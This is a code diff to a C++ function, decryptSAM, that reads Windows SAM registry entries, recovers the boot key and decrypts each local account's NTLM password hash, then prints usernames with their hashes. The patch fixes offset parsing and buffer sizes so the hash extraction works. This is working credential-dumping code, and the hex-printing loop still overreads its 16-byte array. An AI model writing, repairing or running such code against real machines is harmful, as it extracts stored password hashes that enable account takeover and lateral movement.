@@ -285,13 +285,17 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 	CHAR strMagic3[] = "NTPASSWORD";
 
 	for (int i = 0; i < entries; i++) {
-		LONG offset = ((LONG)samRegEntries[i]->v[0x0c]) + 0xcc;
+		LONG offset = 0;
+		CopyMemory(&offset, &samRegEntries[i]->v[0x0C], 4);
+		offset += 0xCC;
 
 		LONG lenUsername = (LONG)samRegEntries[i]->v[0x10];
 		PWCHAR username = (PWCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, lenUsername);
 		CopyMemory(username, &samRegEntries[i]->v[offset], lenUsername);
 
-		offset = ((LONG)samRegEntries[i]->v[0xA8]) + 0xcc;
+		offset = 0;
+		CopyMemory(&offset, &samRegEntries[i]->v[0xA8], 4);
+		offset += 0xCC;
 
 		BYTE bootKey[16];
 		getBootKey(samRegEntries[i], bootKey);
@@ -328,7 +332,7 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 
 			BYTE encNTLMrecovered[16] = {};
 			ArraySink rs2(encNTLMrecovered, 16);
-			ArraySource s2(encNTLM, true,
+			ArraySource s2(encNTLM, 16, true,
 				new StreamTransformationFilter(d2,
 					new Redirector(rs2),
 					StreamTransformationFilter::NO_PADDING
@@ -462,14 +466,14 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 
 		BYTE encNTLM1[16] = {};
 		BYTE encNTLM2[16] = {};
-		CopyMemory(encNTLM1, encNTLM, 16);
-		CopyMemory(encNTLM2, encNTLM + 0x8, 16);
+		CopyMemory(encNTLM1, encNTLM, 8);
+		CopyMemory(encNTLM2, encNTLM + 0x8, 8);
 
 		BYTE NTLM1[8] = {};
 		BYTE NTLM2[8] = {};
 
 		ArraySink rs(NTLM1, 8);
-		ArraySource s(encNTLM1, true,
+		ArraySource s(encNTLM1, 8, true,
 			new StreamTransformationFilter(desD,
 				new Redirector(rs),
 				StreamTransformationFilter::NO_PADDING
@@ -480,7 +484,7 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 		desD2.SetKey(desKey2, 8);
 
 		ArraySink rs2(NTLM2, 8);
-		ArraySource s2(encNTLM2, true,
+		ArraySource s2(encNTLM2, 8, true,
 			new StreamTransformationFilter(desD2,
 				new Redirector(rs2),
 				StreamTransformationFilter::NO_PADDING
@@ -490,12 +494,14 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 		BYTE NTLM[16] = {};
 		CHAR NTLMstr[33] = {};
 		CopyMemory(NTLM, NTLM1, 8);
-		CopyMemory(NTLM + 8, NTLM2, 8);
+		CopyMemory(NTLM + 0x8, NTLM2, 8);
 
 		for (int i = 0; i < 33; i++) {
 			sprintf_s(NTLMstr + i * 2, 33, "%02x", NTLM[i]);
 		}
-		printf("NTLM: %s\n", NTLMstr);
+
+		wprintf(L"User %s -> ", username);
+		printf("NT: %s\n", NTLMstr);
 
 		HeapFree(GetProcessHeap(), 0, username);
 	}
